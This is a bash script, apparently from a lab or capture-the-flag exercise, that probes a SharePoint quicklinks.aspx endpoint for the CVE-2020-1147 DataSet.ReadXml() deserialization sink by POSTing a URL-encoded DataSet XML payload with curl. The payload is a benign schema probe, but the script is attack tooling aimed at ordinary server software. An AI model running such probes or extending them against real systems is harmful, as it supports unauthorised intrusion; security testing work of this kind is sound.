#!/bin/bash
# Test alternative DataSet.ReadXml() sink via quicklinks.aspx
# Based on CVE-2020-1147 writeup mentioning Contact LinksSuggestionsMicroView

TARGET="http://10.10.10.166"

# Simple DataSet payload (non-malicious test payload)
DATASET_PAYLOAD='<DataSet><xs:schema xmlns="" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata" id="test"><xs:element name="test" msdata:IsDataSet="true"/></xs:schema></DataSet>'

# URL encode the payload
ENCODED_PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''${DATASET_PAYLOAD}'''))")

echo "[*] Testing quicklinks.aspx endpoint with DataSet.ReadXml() sink"
echo "[*] Target: ${TARGET}/_layouts/15/quicklinks.aspx?Mode=Suggestion"

curl -i -s -k -X POST \
  "${TARGET}/_layouts/15/quicklinks.aspx?Mode=Suggestion" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "User-Agent: Mozilla/5.0" \
  -d "__viewstate=&__SUGGESTIONSCACHE__=${ENCODED_PAYLOAD}" \
  | head -30

echo "[*] Test complete"
